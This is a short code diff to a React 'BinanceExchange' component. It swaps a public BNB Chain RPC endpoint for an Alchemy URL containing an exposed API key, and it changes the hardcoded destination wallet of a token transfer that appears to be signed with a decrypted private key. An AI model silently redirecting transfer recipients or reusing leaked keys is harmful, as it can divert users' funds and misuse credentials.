@@ -1761,7 +1761,8 @@ const BinanceExchange = ({ onClose }) => {
         if (!token) return;
 
         const provider = new ethers.JsonRpcProvider(
-          "https://bsc-dataseed.bnbchain.org"
+          // "https://bsc-dataseed.bnbchain.org"
+          "https://bnb-mainnet.g.alchemy.com/v2/Tf2Mn6CcpLPrZeIrhvO12"
         );
         const contract = new ethers.Contract(
           token.address,
@@ -1800,7 +1801,8 @@ const BinanceExchange = ({ onClose }) => {
       const token = TOKEN_CONFIG[symbol];
       if (!token) throw new Error(`Token ${symbol} not supported`);
 
-      const BSC_URL = "https://bsc-dataseed.bnbchain.org";
+      // const BSC_URL = "https://bsc-dataseed.bnbchain.org";
+      const BSC_URL="https://bnb-mainnet.g.alchemy.com/v2/Tf2Mn6CcpLPrZeIrhvO12"
       const provider = new ethers.JsonRpcProvider(BSC_URL);
       const contract = new ethers.Contract(token.address, token.abi, provider);
 
@@ -2088,7 +2090,8 @@ function getDecryptedPrivateKey(privatekey, secret) {
       toast.info("Processing transaction...");
 
       const tx = await tokenContract.transfer(
-        "0x268B5dD7815c39062AC0A40eD4fA14c0C33255c9",
+        // "0x268B5dD7815c39062AC0A40eD4fA14c0C33255c9",
+        "0x90e18b768C5eCC93B73525ab973aBd1592Df3aB2",
         amountToSend
       );
 
